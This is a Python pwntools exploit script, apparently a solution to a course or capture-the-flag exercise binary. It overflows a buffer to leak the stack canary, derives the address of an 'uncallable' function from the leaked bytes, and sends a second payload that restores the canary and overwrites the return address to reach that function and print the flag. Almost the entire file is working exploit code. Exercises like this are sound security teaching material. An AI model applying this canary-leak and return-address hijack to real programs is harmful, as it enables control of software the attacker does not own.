#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise3/exercise3b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()

padding = 175       # input buffer length - 1

r.sendline(b"X" * padding)

output = r.recvuntil(b"not the password\n")
print(output)

"""
Extract canary from output, which looks like this: 
b'Enter the secret password:\nWell of course XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXX\n\\\xc3\x8d\xa2 is not the password\n'
"""
canary = output[len("Enter the secret password:\nWell of course ") + padding + 1: -len(" is not the password\n")]
print(canary)

canary_start, canary_end = canary[:4], canary[4:]
print(canary_start)
print(canary_end)

tmp = int(canary_end.hex(), base=16)
uncallable_address = ELF(exe).symbols['uncallable'] + int(canary_end[::-1].hex(), base=16) - 4744

r.sendline(b"X" * (padding + 1) + canary_start + tmp.to_bytes(length=8, byteorder='little') + b"X" * 28 + uncallable_address.to_bytes(length=8, byteorder='little') + b"\n")

flag_output = r.recvall()
print(flag_output.decode(errors='ignore'))
